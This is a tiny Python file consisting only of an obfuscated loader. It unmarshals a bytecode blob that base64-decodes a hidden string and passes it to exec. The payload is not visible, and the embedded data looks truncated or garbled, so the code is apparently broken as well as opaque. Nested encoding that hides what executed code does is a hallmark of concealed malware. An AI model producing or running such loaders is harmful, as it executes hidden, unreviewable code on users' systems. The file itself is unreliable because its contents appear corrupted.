import marshal
exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\xf3h\x00\x00\x00\x97\x00d\x00d\x01l\x00Z\x00\x02\x00e\x01\x02\x00e\x00j\x02\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03d\x04\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01S\x00)\x05\xe9\x00\x00\x00\x00Ns\xe4Q9\z\x05utf-8\xda\x06ignore)\x04\xda\x06base64\xda\x04exec\xda\tb64decode\xda\x06decode\xa9\x00\xf3\x00\x00\x00\x00\xfa\x0f<m a r s h a l>\xfa\x08<module>r\x0b\x00\x00\x00\x01\x00\x00\x00s\x91\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\x00\r\x80\r\x80\r\x80\r\xd8\x00\x04\x80\x04\xd0\x05\x15\x80V\xd4\x05\x15\xf0\x00\x00\x17~GU\x0e\xf1\x00\x00\x06\x7fGU\x0e\xf4\x00\x00\x06\x7fGU\x0e\xf7\x00\x00\x06FHU\x0e\xf2\x00\x00\x06FHU\x0e\xf0\x00\x00GHU\x0eNHU\x0e\xf0\x00\x00OHU\x0eWHU\x0e\xf1\x00\x00\x06XHU\x0e\xf4\x00\x00\x06XHU\x0e\xf1\x00\x00\x01YHU\x0e\xf4\x00\x00\x01YHU\x0e\xf0\x00\x00\x01YHU\x0e\xf0\x00\x00\x01YHU\x0e\xf0\x00\x00\x01YHU\x0er\t\x00\x00\x00'))